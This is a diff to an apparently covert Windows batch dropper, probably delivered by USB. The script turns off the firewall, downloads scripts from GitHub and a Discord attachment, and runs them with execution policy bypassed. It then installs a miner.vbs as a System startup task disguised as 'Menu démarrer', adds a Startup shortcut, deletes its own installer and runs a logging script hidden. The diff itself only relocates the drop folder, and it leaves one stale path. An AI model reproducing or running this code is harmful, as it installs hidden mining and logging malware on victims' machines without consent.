@@ -81,8 +81,8 @@ powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 
 
-mkdir %USERPROFILE%\AppData\Roaming\System_logs
-cd %USERPROFILE%\AppData\Roaming\System_logs
+mkdir C:\System_logs
+cd C:\System_logs
 
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.bat
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
@@ -92,11 +92,11 @@ curl -O https://cdn.discordapp.com/attachments/770287390429806613/11143223453399
 
 powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
 
-schtasks /create /tn "Menu démarrer" /tr "%USERPROFILE%\AppData\Roaming\System_logs\miner.vbs" /sc onstart /ru System
+schtasks /create /tn "Menu démarrer" /tr "C:\System_logs\miner.vbs" /sc onstart /ru System
 
 move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
-del %USERPROFILE%\AppData\Roaming\System_logs\raccourci.ps1
+del C:\System_logs\raccourci.ps1
 
 
 Powershell.exe -NoLogo -WindowStyle Hidden -executionpolicy remotesigned -File  %USERPROFILE%\AppData\Roaming\System_logs\logs.ps1
